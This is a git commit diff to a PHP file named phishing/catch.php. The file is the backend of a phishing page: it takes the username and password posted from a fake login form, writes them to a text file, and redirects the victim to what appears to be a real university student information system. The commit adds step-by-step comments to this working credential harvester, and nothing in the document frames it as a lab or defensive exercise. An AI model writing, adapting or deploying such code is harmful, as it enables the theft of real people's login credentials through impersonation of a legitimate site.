9b77bab1d4df0982f7ce0ee88b2df60a7b374a1e
tharushi-pushpakumara <tharushi.dinethri@gmail.com>
2017-03-20 12:20:44 +0530

    Update catch.php

--- phishing/catch.php
+++ phishing/catch.php
@@ -1,19 +1,31 @@
 <?php 
+
 //this stores credentials in a file and redirects the user to original website
-$myFile = "info.txt";
+//info.txt file is the place where the caught credentials are stored
+
+// assign the file name to a variable
+$myFile = "info.txt"; 
+// Open the info.txt file for writing purpose. If it cannot be opened then show the massage can't open the file
 $fh = fopen($myFile, 'w') or die("can't open file");
 
+//get the uname value to a variable
 $uname=$_POST['uname'];
+// write the uname in info.txt ile
 fwrite($fh, $uname);
 
+// keep a space in info.txt ile
 $space="   ";
 fwrite($fh, $space);
 
+//get the password value to a variable
 $pword=$_POST['pw'];
+// write the password in info.txt ile
 fwrite($fh, $pword);
 
+// close the opened info.txt file
 fclose($fh);
 
+//derect to the original url
 header("Location: http://sis.cmb.ac.lk/sci/");
 exit();
 
